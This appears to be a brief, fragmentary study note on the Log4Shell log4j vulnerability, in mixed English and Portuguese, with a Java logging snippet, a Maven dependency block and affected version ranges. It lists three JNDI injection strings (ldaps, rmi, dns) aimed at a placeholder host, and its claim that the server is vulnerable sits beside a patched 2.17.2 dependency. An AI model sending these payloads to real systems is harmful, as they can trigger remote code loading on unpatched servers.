
### log4j
https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/

`${jndi:ldaps://somedomain.com}`

`${jndi:rmi://somedomain.com}`

`${jndi:dns://somedomain.com}`

```
LOGGER.info("msg: {}", args);
    // TODO: implement bot commands
    String cmd = System.getProperty("cmd");
    if (cmd.equals("help")) {
      doHelp();
      return;
    }
	
```
	
server side:logo é vuneravel ao log4j

	
```
 <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.17.2</version>
    </dependency>

	
```

The Java application uses log4j (Maven package [log4j-core](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core)) version 2.0.0-2.12.1 or 2.13.0-2.14.1

https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.17.2/

chatbot/src/main/resources/log4j2.xml
